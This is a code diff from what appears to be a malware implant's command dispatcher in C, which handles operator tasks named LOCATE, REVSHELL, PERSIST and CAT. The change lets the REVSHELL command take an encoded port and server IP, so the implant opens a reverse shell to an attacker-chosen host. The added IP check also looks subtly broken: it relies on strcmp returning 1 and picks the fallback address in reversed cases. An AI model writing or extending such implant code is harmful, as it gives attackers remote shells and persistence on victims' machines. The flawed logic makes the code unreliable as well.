@@ -131,7 +131,15 @@ void check_commands() {
         } else if (strcmp(type, "LOCATE") == 0) {
             task_locate(id_task);
         } else if (strcmp(type, "REVSHELL") == 0) {
-            task_revshell();
+            char* server_port_str = decode(strtok(NULL, ","));
+            int server_port = atoi(server_port_str);
+            char* server_ip = strtok(NULL, ",");
+            if (strcmp(server_ip, "null") == 1) {
+                server_ip = decode(server_ip);
+            } else {
+                server_ip = "127.0.0.1";
+            }
+            task_revshell(server_port, server_ip);
         } else if (strcmp(type, "PERSIST") == 0) {
             task_persist();
         } else if (strcmp(type, "CAT") == 0) {
